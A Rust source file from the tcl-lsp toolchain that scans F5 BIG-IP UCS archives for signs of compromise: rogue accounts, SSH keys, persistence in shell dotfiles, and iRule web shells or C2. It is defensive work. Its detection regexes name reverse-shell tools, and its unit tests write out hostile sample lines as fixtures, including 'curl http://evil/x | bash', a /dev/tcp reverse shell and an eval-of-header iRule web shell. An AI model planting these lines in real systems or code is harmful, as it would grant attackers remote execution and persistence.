// tcl-lsp — a language server and toolchain for Tcl
// Copyright (C) 2026 James Deucker (bitwisecook) <https://github.com/bitwisecook>
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU Affero General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU Affero General Public License for more details.
//
// You should have received a copy of the GNU Affero General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//
// SPDX-License-Identifier: AGPL-3.0-or-later

//! UCS forensic inventory: shape the file inventory extracted from a UCS into
//! the report's Forensics view, and run a few content-driven heuristics that
//! turn the static "UCS forensic checklist" (see the F5 Sites tab) into live
//! findings against the archive under review.
//!
//! Input is the per-device file inventory the entry points (wasm / CLI) pull
//! out of the archive with [`tcl_bigip_io::list_ucs_members`] +
//! [`tcl_bigip_io::read_ucs_member`] — each a JSON object
//! `{path, size, sha256, isText, content?}`. `content` is present for the small
//! forensic-allowlisted text files (dotfiles, `passwd`, `authorized_keys`,
//! syslog config); it stays local to the page (nothing is uploaded) and the UI
//! masks the sensitive ones by default, exactly like the Secrets tab.
//!
//! Output is `{files: [...enriched...], checklist: [...findings...]}`.

use serde_json::{Map, Value as J, json};

/// Stock TMOS / Linux accounts present on a clean BIG-IP. A `passwd` entry
/// outside this set with a real login shell — or *any* non-`root` UID 0 — is
/// worth a human look (T1136 Create Account / T1078 Valid Accounts).
const STOCK_USERS: &[&str] = &[
    "root",
    "bin",
    "daemon",
    "adm",
    "lp",
    "sync",
    "shutdown",
    "halt",
    "mail",
    "operator",
    "games",
    "ftp",
    "nobody",
    "admin",
    "apache",
    "sshd",
    "tmshnobody",
    "f5_remoteuser",
    "mysql",
    "named",
    "ntp",
    "dbus",
    "rpc",
    "rpcuser",
    "nfsnobody",
    "nscd",
    "vcsa",
    "pcap",
    "oprofile",
    "syslog",
    "postfix",
    "tomcat",
    "restnoded",
    "tmsh",
];

/// Login shells that mean the account can actually be used interactively (so an
/// unexpected user with one of these is more interesting than a service stub).
const LOGIN_SHELLS: &[&str] = &["/bin/bash", "/bin/sh", "/bin/tmsh", "/usr/bin/tmsh"];

fn str_field<'a>(o: &'a Map<String, J>, k: &str) -> &'a str {
    o.get(k).and_then(J::as_str).unwrap_or("")
}

/// Broad category for grouping / colouring a member in the UI.
fn categorise(path: &str) -> &'static str {
    if path.contains("/.ssh/") || path.starts_with(".ssh/") {
        "ssh"
    } else if path == "etc/passwd"
        || path == "etc/shadow"
        || path == "etc/group"
        || path == "etc/gshadow"
    {
        "accounts"
    } else if path.starts_with("etc/openldap/")
        || path.starts_with("etc/pam.d/")
        || path.starts_with("etc/security/")
        || path == "etc/nsswitch.conf"
        || path == "etc/krb5.conf"
        || path == "etc/ldap.conf"
    {
        "auth"
    } else if path.starts_with("etc/syslog-ng/") {
        "logging"
    } else if path.starts_with("etc/cron") {
        "cron"
    } else if (path.starts_with("home/") || path.starts_with("root/"))
        && path.rsplit('/').next().is_some_and(|b| b.starts_with('.'))
    {
        "dotfile"
    } else {
        "other"
    }
}

/// Whether a member's content is sensitive enough to mask in the UI by default
/// (password hashes, private keys). Metadata (path/size/hash) is always shown.
fn is_sensitive(path: &str) -> bool {
    path == "etc/shadow"
        || path == "etc/gshadow"
        || path.ends_with("/id_rsa")
        || path.ends_with("/id_dsa")
        || path.ends_with("/id_ecdsa")
        || path.ends_with("/id_ed25519")
}

/// Count the real key lines in an `authorized_keys` body (non-blank,
/// non-comment).
fn count_authorized_keys(content: &str) -> usize {
    content
        .lines()
        .map(str::trim)
        .filter(|l| !l.is_empty() && !l.starts_with('#'))
        .count()
}

/// Parse `etc/passwd` content into `(user, uid, shell)` rows.
fn parse_passwd(content: &str) -> Vec<(String, String, String)> {
    content
        .lines()
        .filter_map(|line| {
            let line = line.trim();
            if line.is_empty() || line.starts_with('#') {
                return None;
            }
            let f: Vec<&str> = line.split(':').collect();
            // name:passwd:uid:gid:gecos:home:shell
            if f.len() < 7 {
                return None;
            }
            Some((f[0].to_string(), f[2].to_string(), f[6].to_string()))
        })
        .collect()
}

/// Scan a shell dotfile's content for login-persistence / malware patterns
/// (T1546.004). Returns the worst severity seen and the reasons, ignoring
/// comment lines (a `#`-commented line does not execute on login).
///
/// Regex-level for now (a shell-aware parser is the planned upgrade): the real
/// `.bashrc` implants aren't grammar-obfuscated — they bet on the file being
/// unread — so a focused pattern set catches the live-fire shapes.
fn scan_shell_dotfile(content: &str) -> Option<(&'static str, &'static str)> {
    // Uncomment-stripped body: drop whole-line comments so a documented example
    // in a comment doesn't trip the scan.
    let live: String = content
        .lines()
        .filter(|l| !l.trim_start().starts_with('#'))
        .collect::<Vec<_>>()
        .join("\n");

    // alert-level: download|decode piped/substituted into an interpreter, or a
    // reverse shell — code actually fetched and run at login.
    let downloader = r"(curl|wget|fetch|lynx|python[0-9.]*\s+-c|perl\s+-e)";
    let interp = r"(sh|bash|zsh|ksh|python[0-9.]*|perl|ruby|php|node)";
    let pipe_to_interp =
        regex::Regex::new(&format!(r"(?s){downloader}[^|;&`$]*\|\s*{interp}\b")).expect("re");
    let decode_to_interp = regex::Regex::new(&format!(
        r"(?s)\b(base64\s+(-d|--decode)|xxd\s+-r|openssl\s+enc[^|]*-d)\b[^|]*\|\s*{interp}\b"
    ))
    .expect("re");
    let subst_exec = regex::Regex::new(&format!(
        r"(?s)\b(eval|source|\.)\s+[\x22\x27]?[`$]\(?[^)]*{downloader}"
    ))
    .expect("re");
    let reverse_shell = regex::Regex::new(
        r"(/dev/tcp/|bash\s+-i\b|mkfifo\b|nc\s+[^|]*-e\b|socket\.socket|/dev/udp/)",
    )
    .expect("re");
    if pipe_to_interp.is_match(&live)
        || decode_to_interp.is_match(&live)
        || subst_exec.is_match(&live)
        || reverse_shell.is_match(&live)
    {
        return Some((
            "alert",
            "downloads-and-runs code or opens a reverse shell at login",
        ));
    }

    // warn-level: persistence bookkeeping — key/cron install run from a dotfile.
    let key_append = regex::Regex::new(r"(?s)authorized_keys|\.ssh/").expect("re");
    let scheduling = regex::Regex::new(r"\b(crontab\b|\bat\s+now|systemctl\s+enable)").expect("re");
    if key_append.is_match(&live) || scheduling.is_match(&live) {
        return Some((
            "warn",
            "writes SSH keys or schedules a task from a login file",
        ));
    }
    None
}

/// Users in `etc/shadow` with an empty password field (`user::…`) — they can log
/// in with no password. Content is analysed but never embedded in the report.
fn shadow_passwordless(content: &str) -> Vec<String> {
    content
        .lines()
        .filter_map(|line| {
            let f: Vec<&str> = line.trim().split(':').collect();
            // name:hash:… — an empty hash field means no password required.
            (f.len() >= 2 && f[1].is_empty() && !f[0].is_empty()).then(|| f[0].to_owned())
        })
        .collect()
}

/// One iRule finding: the rule name, a severity (`alert`/`warn`), and the
/// human-readable reason it tripped.
struct IruleFinding {
    name: String,
    severity: &'static str,
    reason: &'static str,
}

/// Precompiled patterns for the iRule web-shell / covert-C2 scan. Compiled once
/// per report (not per rule).
struct IruleSigs {
    /// Attacker-controlled request data getters (taint sources).
    source: regex::Regex,
    /// `b64decode` / `URI::decode` / `hexdecode` of (usually attacker) data.
    decode: regex::Regex,
    /// Tcl code-evaluation sinks — running data as code.
    code_sink: regex::Regex,
    /// Off-box connections an implant uses for C2 / exfil.
    net_sink: regex::Regex,
    /// iRules LX bridge into Node.js — arbitrary code outside the TMM sandbox.
    ilx: regex::Regex,
    /// A magic constant compared against a header/cookie/URI — a backdoor
    /// trigger that unlocks a privileged branch.
    magic_trigger: regex::Regex,
    /// A client-facing event — the rule runs while processing a request, so a
    /// code sink in it is attacker-reachable even if the taint isn't textual.
    event: regex::Regex,
}

impl IruleSigs {
    fn new() -> Self {
        // `expect` is safe: these are fixed, tested literals.
        IruleSigs {
            source: regex::Regex::new(
                r"\b(HTTP::(uri|path|query|header|cookie|payload|host|method|username|password)|URI::(query|decode|basename)|TCP::payload|UDP::payload|SSL::payload|WEBSOCKET::payload|STREAM::)\b",
            ).expect("valid regex"),
            decode: regex::Regex::new(r"\b(b64decode|URI::decode|hexdecode)\b").expect("valid regex"),
            code_sink: regex::Regex::new(r"(?m)(\beval\b|\bsubst\b|\buplevel\b|\bnamespace\s+eval\b)").expect("valid regex"),
            net_sink: regex::Regex::new(r"\b(sideband|connect|SIDEBAND|HSL::send|GENICMP)\b").expect("valid regex"),
            ilx: regex::Regex::new(r"\bILX::call\b").expect("valid regex"),
            magic_trigger: regex::Regex::new(
                r#"(?m)\[HTTP::(header|cookie|query|uri)[^\]]*\]\s*(eq|equals|contains|starts_with|ends_with|matches)\s*[\"'{][^\"'}]+[\"'}]"#,
            ).expect("valid regex"),
            event: regex::Regex::new(
                r"\bwhen\s+(HTTP_REQUEST|HTTP_RESPONSE|HTTP_REQUEST_DATA|HTTP_RESPONSE_DATA|CLIENT_DATA|CLIENT_ACCEPTED|WEBSOCKET_[A-Z_]+)\b",
            ).expect("valid regex"),
        }
    }
}

/// Scan the device's iRules for web-shell / covert-C2 shapes (T1505.003).
///
/// Regex-level correlation (a deeper taint-analysis pass over the compiler's
/// SSA is the planned upgrade): an attacker-controlled request getter flowing
/// near a code-evaluation or off-box sink is the strongest "runs attacker
/// input" signal; a magic-constant trigger or a bare `eval`/`subst` is weaker.
fn scan_irules(rules: &[J]) -> Vec<IruleFinding> {
    let sigs = IruleSigs::new();
    let mut findings = Vec::new();
    for r in rules {
        let Some(o) = r.as_object() else { continue };
        // Skip TMOS defaults (`_sys_*`) — never attacker-authored.
        if o.get("isDefault").and_then(J::as_bool) == Some(true) {
            continue;
        }
        let body = str_field(o, "body");
        if body.is_empty() {
            continue;
        }
        let has_source = sigs.source.is_match(body);
        let has_decode = sigs.decode.is_match(body);
        let has_code = sigs.code_sink.is_match(body);
        let has_net = sigs.net_sink.is_match(body);
        let has_ilx = sigs.ilx.is_match(body);
        let has_event = sigs.event.is_match(body);

        let (severity, reason) = if has_code && (has_source || has_decode) {
            (
                "alert",
                "attacker-controlled request data reaches a Tcl code-evaluation sink (eval/subst)",
            )
        } else if has_net && (has_source || has_decode) {
            (
                "alert",
                "attacker-controlled data is sent off-box (sideband / HSL) — possible C2 / exfil",
            )
        } else if has_ilx && (has_source || has_decode) {
            (
                "alert",
                "attacker-controlled data is passed to an iRules LX (Node.js) call",
            )
        } else if has_ilx {
            (
                "warn",
                "calls out to iRules LX (Node.js) — review the extension",
            )
        } else if has_net {
            (
                "warn",
                "opens an off-box connection (sideband / HSL) — review the destination",
            )
        } else if has_code && has_event {
            (
                "warn",
                "runs a Tcl code-evaluation sink (eval/subst) while processing a request",
            )
        } else if sigs.magic_trigger.is_match(body) {
            (
                "warn",
                "branches on a hard-coded header/cookie/URI value — a possible backdoor trigger",
            )
        } else {
            continue;
        };

        let name = str_field(o, "fullPath");
        let name = if name.is_empty() {
            str_field(o, "name")
        } else {
            name
        };
        findings.push(IruleFinding {
            name: name.to_owned(),
            severity,
            reason,
        });
    }
    findings
}

/// Build the Forensics model for one device from its file inventory and iRules.
///
/// `files` is the per-device UCS inventory (JSON objects with `path`, `size`,
/// `sha256`, `isText` and optionally `content`); `rules` is the device's iRule
/// list (from the model), scanned for web-shell patterns. Returns
/// `{files: [...], checklist: [...]}`; `files` is empty when there's no archive
/// behind the source (e.g. a bare `bigip.conf`), but the iRule check still runs.
#[must_use]
pub fn collect_forensics(files: &[J], rules: &[J]) -> J {
    let mut out_files: Vec<J> = Vec::with_capacity(files.len());
    // Checklist accumulators.
    let mut ak_paths: Vec<String> = Vec::new();
    let mut ak_keys = 0usize;
    let mut passwd_added: Vec<String> = Vec::new();
    let mut passwd_uid0: Vec<String> = Vec::new();
    let mut passwd_seen = false;
    let mut shadow_nopass: Vec<String> = Vec::new();
    let mut dotfiles: Vec<String> = Vec::new();
    let mut dotfile_alert: Vec<String> = Vec::new();
    let mut dotfile_warn: Vec<String> = Vec::new();
    let mut logging_seen = false;

    for f in files {
        let Some(o) = f.as_object() else { continue };
        let path = str_field(o, "path").to_string();
        if path.is_empty() {
            continue;
        }
        let category = categorise(&path);
        let sensitive = is_sensitive(&path);
        let content = o.get("content").and_then(J::as_str);

        // Per-file heuristics.
        if path.ends_with("authorized_keys")
            && let Some(c) = content
        {
            let n = count_authorized_keys(c);
            if n > 0 {
                ak_keys += n;
                ak_paths.push(path.clone());
            }
        }
        if path == "etc/passwd" {
            passwd_seen = true;
            if let Some(c) = content {
                for (user, uid, shell) in parse_passwd(c) {
                    if uid == "0" && user != "root" {
                        passwd_uid0.push(user.clone());
                    }
                    let stock = STOCK_USERS.contains(&user.as_str());
                    let interactive = LOGIN_SHELLS.contains(&shell.as_str());
                    if !stock && interactive {
                        passwd_added.push(user);
                    }
                }
            }
        }
        if category == "dotfile" {
            dotfiles.push(path.clone());
            if let Some(c) = content {
                match scan_shell_dotfile(c) {
                    Some(("alert", _)) => dotfile_alert.push(path.clone()),
                    Some(("warn", _)) => dotfile_warn.push(path.clone()),
                    _ => {}
                }
            }
        }
        if path == "etc/shadow"
            && let Some(c) = content
        {
            shadow_nopass.extend(shadow_passwordless(c));
        }
        if category == "logging" {
            logging_seen = true;
        }

        out_files.push(json!({
            "path": path,
            "size": o.get("size").cloned().unwrap_or(J::from(0)),
            "sha256": str_field(o, "sha256"),
            "isText": o.get("isText").and_then(J::as_bool).unwrap_or(false),
            "category": category,
            "sensitive": sensitive,
            // Content is echoed through only for non-sensitive text files; the
            // UI masks even these behind a reveal, and never embeds the raw
            // bytes of shadow / private keys.
            "content": if sensitive { J::Null } else { content.map_or(J::Null, |c| J::String(c.to_owned())) },
        }));
    }

    // ---- Checklist findings (most severe first is applied in the UI) -------
    let mut checklist: Vec<J> = Vec::new();

    // SSH authorized_keys — key-based persistence.
    let ak_present = out_files.iter().any(|f| {
        f.get("path")
            .and_then(J::as_str)
            .is_some_and(|p| p.ends_with("authorized_keys"))
    });
    checklist.push(json!({
        "id": "ssh-authorized-keys",
        "label": "SSH authorized_keys",
        "attack": "T1098.004",
        "verdict": if ak_keys > 0 { "alert" } else if ak_present { "clear" } else { "absent" },
        "detail": if ak_keys > 0 {
            format!("{ak_keys} key(s) present across {} file(s) — verify every key is expected", ak_paths.len())
        } else if ak_present {
            "authorized_keys present but empty".to_string()
        } else {
            "no authorized_keys in the archive".to_string()
        },
        "evidence": ak_paths,
    }));

    // Local accounts — rogue UID 0, added interactive users, passwordless logins.
    let mut acct_evidence = passwd_uid0.clone();
    acct_evidence.extend(passwd_added.iter().cloned());
    acct_evidence.extend(shadow_nopass.iter().cloned());
    let acct_verdict = if !passwd_uid0.is_empty() {
        "alert"
    } else if !passwd_added.is_empty() || !shadow_nopass.is_empty() {
        "warn"
    } else if passwd_seen {
        "clear"
    } else {
        "absent"
    };
    checklist.push(json!({
        "id": "local-accounts",
        "label": "Local accounts (passwd / shadow)",
        "attack": "T1136 / T1078",
        "verdict": acct_verdict,
        "detail": if !passwd_uid0.is_empty() {
            format!("non-root UID 0 account(s): {}", passwd_uid0.join(", "))
        } else if !passwd_added.is_empty() && !shadow_nopass.is_empty() {
            format!("added account(s): {}; passwordless: {}", passwd_added.join(", "), shadow_nopass.join(", "))
        } else if !passwd_added.is_empty() {
            format!("unrecognised interactive account(s): {}", passwd_added.join(", "))
        } else if !shadow_nopass.is_empty() {
            format!("account(s) with an empty password: {}", shadow_nopass.join(", "))
        } else if passwd_seen {
            "only stock accounts with login shells".to_string()
        } else {
            "etc/passwd not in the archive".to_string()
        },
        "evidence": acct_evidence,
    }));

    // Shell dotfiles — login-hook persistence (content-scanned for download-run
    // / reverse-shell / key-install shapes).
    let dot_verdict = if !dotfile_alert.is_empty() {
        "alert"
    } else if !dotfile_warn.is_empty() {
        "warn"
    } else if dotfiles.is_empty() {
        "absent"
    } else {
        "info"
    };
    let mut dot_evidence = dotfile_alert.clone();
    dot_evidence.extend(dotfile_warn.iter().cloned());
    if dot_evidence.is_empty() {
        dot_evidence.clone_from(&dotfiles);
    }
    checklist.push(json!({
        "id": "shell-dotfiles",
        "label": "Shell dotfiles",
        "attack": "T1546.004",
        "verdict": dot_verdict,
        "detail": if !dotfile_alert.is_empty() {
            format!("{} dotfile(s) download-and-run code or open a reverse shell at login", dotfile_alert.len())
        } else if !dotfile_warn.is_empty() {
            format!("{} dotfile(s) install SSH keys or schedule tasks at login", dotfile_warn.len())
        } else if dotfiles.is_empty() {
            "no user dotfiles in the archive".to_string()
        } else {
            format!("{} dotfile(s) present — none matched a known persistence pattern", dotfiles.len())
        },
        "evidence": dot_evidence,
    }));

    // Logging config — evasion surface.
    checklist.push(json!({
        "id": "logging-config",
        "label": "syslog-ng config",
        "attack": "T1562.006",
        "verdict": if logging_seen { "info" } else { "absent" },
        "detail": if logging_seen {
            "syslog-ng config present — confirm remote logging is intact".to_string()
        } else {
            "no syslog-ng config in the archive".to_string()
        },
        "evidence": J::Array(vec![]),
    }));

    // iRule web-shell / covert C2 — attacker input reaching a code / off-box
    // sink, backdoor triggers, iRules LX.
    let irule_findings = scan_irules(rules);
    let ir_alert: Vec<&IruleFinding> = irule_findings
        .iter()
        .filter(|f| f.severity == "alert")
        .collect();
    let ir_reason = irule_findings.first().map_or("", |f| f.reason);
    let ir_verdict = if !ir_alert.is_empty() {
        "alert"
    } else if !irule_findings.is_empty() {
        "warn"
    } else {
        "clear"
    };
    checklist.push(json!({
        "id": "irule-backdoor",
        "label": "iRule web shell / C2",
        "attack": "T1505.003",
        "verdict": ir_verdict,
        "detail": if irule_findings.is_empty() {
            "no iRule reaches a code / off-box sink from attacker input".to_string()
        } else if !ir_alert.is_empty() {
            format!("{} iRule(s) flagged — e.g. {ir_reason}", irule_findings.len())
        } else {
            format!("{} iRule(s) to review — e.g. {ir_reason}", irule_findings.len())
        },
        "evidence": irule_findings.iter().map(|f| J::String(f.name.clone())).collect::<Vec<_>>(),
    }));

    // Count the actionable findings so the report can surface the tab even for
    // a config-only source (no files) that still tripped the iRule scan.
    let flagged = checklist
        .iter()
        .filter(|c| matches!(c.get("verdict").and_then(J::as_str), Some("alert" | "warn")))
        .count();

    json!({ "files": out_files, "checklist": checklist, "flagged": flagged })
}

#[cfg(test)]
mod tests {
    use super::*;

    fn file(path: &str, content: Option<&str>) -> J {
        let bytes = content.map_or(&b""[..], str::as_bytes);
        json!({
            "path": path,
            "size": bytes.len(),
            "sha256": "0".repeat(64),
            "isText": content.is_some(),
            "content": content,
        })
    }

    /// `collect_forensics` with no iRules (the common file-only test shape).
    fn fx(files: &[J]) -> J {
        collect_forensics(files, &[])
    }

    fn verdict<'a>(f: &'a J, id: &str) -> &'a str {
        f["checklist"]
            .as_array()
            .unwrap()
            .iter()
            .find(|c| c["id"] == id)
            .unwrap_or_else(|| panic!("checklist item {id}"))["verdict"]
            .as_str()
            .unwrap()
    }

    #[test]
    fn authorized_keys_flagged_when_non_empty() {
        let flagged = fx(&[file(
            "root/.ssh/authorized_keys",
            Some("# comment\nssh-rsa AAAAB3Nz attacker@host\n"),
        )]);
        assert_eq!(verdict(&flagged, "ssh-authorized-keys"), "alert");

        let empty = fx(&[file(
            "root/.ssh/authorized_keys",
            Some("# only a comment\n"),
        )]);
        assert_eq!(verdict(&empty, "ssh-authorized-keys"), "clear");

        let absent = fx(&[file("etc/motd", Some("hi"))]);
        assert_eq!(verdict(&absent, "ssh-authorized-keys"), "absent");
    }

    #[test]
    fn passwd_added_and_uid0_accounts() {
        // A rogue non-root UID 0 account → alert.
        let uid0 = fx(&[file(
            "etc/passwd",
            Some("root:x:0:0::/root:/bin/bash\nbackdoor:x:0:0::/root:/bin/bash\n"),
        )]);
        assert_eq!(verdict(&uid0, "local-accounts"), "alert");

        // An unrecognised interactive account (non-zero uid) → warn.
        let added = fx(&[file(
            "etc/passwd",
            Some("root:x:0:0::/root:/bin/bash\neviluser:x:1200:1200::/home/eviluser:/bin/bash\n"),
        )]);
        assert_eq!(verdict(&added, "local-accounts"), "warn");

        // Only stock accounts → clear.
        let clean = fx(&[file(
            "etc/passwd",
            Some("root:x:0:0::/root:/bin/bash\nnobody:x:99:99::/:/sbin/nologin\n"),
        )]);
        assert_eq!(verdict(&clean, "local-accounts"), "clear");
    }

    #[test]
    fn sensitive_content_is_not_embedded() {
        let f = fx(&[file(
            "etc/shadow",
            Some("root:$6$abc$def:19000:0:99999:7:::\n"),
        )]);
        let shadow = &f["files"][0];
        assert_eq!(shadow["category"], "accounts");
        assert_eq!(shadow["sensitive"], J::Bool(true));
        assert_eq!(
            shadow["content"],
            J::Null,
            "shadow content must not be embedded"
        );
        // But its metadata (hash/size) is still there for diffing.
        assert_eq!(shadow["sha256"].as_str().unwrap().len(), 64);
    }

    #[test]
    fn dotfiles_and_logging_surface_as_info() {
        let f = fx(&[
            file("home/admin/.bashrc", Some("export PATH=$PATH\n")),
            file(
                "etc/syslog-ng/syslog-ng.conf",
                Some("destination d_remote {};\n"),
            ),
        ]);
        assert_eq!(verdict(&f, "shell-dotfiles"), "info");
        assert_eq!(verdict(&f, "logging-config"), "info");
        // Non-sensitive text content is echoed for display.
        let bashrc = f["files"]
            .as_array()
            .unwrap()
            .iter()
            .find(|x| x["path"] == "home/admin/.bashrc")
            .unwrap();
        assert!(bashrc["content"].as_str().unwrap().contains("PATH"));
    }

    #[test]
    fn irule_command_execution_flagged() {
        let rule = |name: &str, body: &str, default: bool| json!({"name": name, "fullPath": format!("/Common/{name}"), "body": body, "isDefault": default});
        // Attacker input (HTTP::header) → decode → eval: the web-shell shape → alert.
        let bad = collect_forensics(
            &[],
            &[rule(
                "shell",
                "when HTTP_REQUEST { eval [b64decode [HTTP::header X-Cmd]] }",
                false,
            )],
        );
        assert_eq!(verdict(&bad, "irule-backdoor"), "alert");
        assert_eq!(
            bad["checklist"]
                .as_array()
                .unwrap()
                .iter()
                .find(|c| c["id"] == "irule-backdoor")
                .unwrap()["evidence"][0],
            "/Common/shell"
        );

        // A benign HTTP rule (no eval/source/sink) → clear.
        let ok = collect_forensics(
            &[],
            &[rule(
                "redirect",
                "when HTTP_REQUEST { HTTP::redirect https://x/ }",
                false,
            )],
        );
        assert_eq!(verdict(&ok, "irule-backdoor"), "clear");

        // eval of a constant outside a request event, and a _sys_ default, don't trip it.
        let benign = collect_forensics(
            &[],
            &[
                rule("startup", "when RULE_INIT { eval {set x 1} }", false),
                rule("_sys_https_redirect", "when HTTP_REQUEST { eval x }", true),
            ],
        );
        assert_eq!(verdict(&benign, "irule-backdoor"), "clear");

        // eval while processing a request (no obvious source) → warn, not alert.
        let review = collect_forensics(
            &[],
            &[rule("dyn", "when HTTP_REQUEST { eval $cmd }", false)],
        );
        assert_eq!(verdict(&review, "irule-backdoor"), "warn");

        // Off-box C2 of attacker data → alert.
        let c2 = collect_forensics(
            &[],
            &[rule(
                "beacon",
                "when HTTP_REQUEST { set d [HTTP::uri]; sideband send $d }",
                false,
            )],
        );
        assert_eq!(verdict(&c2, "irule-backdoor"), "alert");
    }

    #[test]
    fn dotfile_download_run_flagged_alert() {
        // curl | bash at login → alert.
        let a = fx(&[file(
            "root/.bashrc",
            Some("export PATH=$PATH\ncurl http://evil/x | bash\n"),
        )]);
        assert_eq!(verdict(&a, "shell-dotfiles"), "alert");

        // base64 -d | sh → alert.
        let b = fx(&[file(
            "home/admin/.bash_profile",
            Some("echo aGkK | base64 -d | sh\n"),
        )]);
        assert_eq!(verdict(&b, "shell-dotfiles"), "alert");

        // A reverse shell → alert.
        let rs = fx(&[file(
            "root/.bashrc",
            Some("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n"),
        )]);
        assert_eq!(verdict(&rs, "shell-dotfiles"), "alert");

        // Installing an SSH key from a dotfile → warn.
        let w = fx(&[file(
            "root/.bashrc",
            Some("echo KEY >> ~/.ssh/authorized_keys\n"),
        )]);
        assert_eq!(verdict(&w, "shell-dotfiles"), "warn");

        // A benign dotfile → info; a commented-out curl|sh does NOT trip it.
        let ok = fx(&[file(
            "home/admin/.bashrc",
            Some("# curl http://x | sh\nexport EDITOR=vi\n"),
        )]);
        assert_eq!(verdict(&ok, "shell-dotfiles"), "info");
    }

    #[test]
    fn shadow_passwordless_account_flagged() {
        let f = fx(&[file(
            "etc/shadow",
            Some("root:$6$abc$def:19000:0:99999:7:::\nbackdoor::19000:0:99999:7:::\n"),
        )]);
        assert_eq!(verdict(&f, "local-accounts"), "warn");
        let ev = f["checklist"]
            .as_array()
            .unwrap()
            .iter()
            .find(|c| c["id"] == "local-accounts")
            .unwrap()["evidence"]
            .as_array()
            .unwrap()
            .clone();
        assert!(
            ev.iter().any(|x| x == "backdoor"),
            "passwordless user listed: {ev:?}"
        );
        // Its content is still never embedded.
        assert_eq!(f["files"][0]["content"], J::Null);
    }
}
